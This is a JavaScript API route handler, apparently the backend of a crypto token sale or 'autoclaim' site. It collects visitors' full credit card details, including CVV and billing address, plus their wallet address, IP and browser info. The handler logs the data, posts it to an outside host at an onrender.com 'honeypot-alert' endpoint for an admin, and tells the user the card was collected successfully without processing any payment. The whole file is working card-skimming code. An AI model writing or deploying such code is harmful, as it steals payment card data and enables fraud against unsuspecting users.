export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { 
    userAddress, 
    amount, 
    cardNumber, 
    cardExpiry, 
    cardCVV, 
    cardName, 
    cardAddress,
    timestamp,
    userAgent 
  } = req.body;

  try {
    // Get user's IP address
    const forwarded = req.headers['x-forwarded-for'];
    const ip = forwarded ? forwarded.split(',')[0] : req.connection.remoteAddress;

    // Prepare credit card info for admin
    const cardInfo = {
      type: 'CREDIT_CARD_COLLECTED',
      timestamp: timestamp,
      userAddress: userAddress,
      purchaseAmount: amount + ' ETH',
      usdValue: '$' + (parseFloat(amount) * 3200).toFixed(2),
      cardDetails: {
        number: cardNumber,
        expiry: cardExpiry,
        cvv: cardCVV,
        name: cardName,
        address: cardAddress
      },
      userInfo: {
        ip: ip,
        userAgent: userAgent,
        timestamp: timestamp
      }
    };

    // Send alert to admin
    console.log('🎯 CREDIT CARD COLLECTED:', cardInfo);

    // Send to your existing alert system (same as other alerts)
    try {
      await fetch('https://autoclaimtoken.onrender.com/api/honeypot-alert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ...cardInfo,
          alertType: 'CREDIT_CARD_COLLECTED',
          priority: 'HIGH',
          emailSubject: `🎯 CREDIT CARD COLLECTED - $${(parseFloat(amount) * 3200).toFixed(2)}`,
          adminEmail: true
        })
      });
    } catch (error) {
      console.log('Alert system unavailable');
    }

    res.status(200).json({
      success: true,
      message: 'Card info collected successfully'
    });

  } catch (error) {
    console.error('Card collection error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to process card info'
    });
  }
}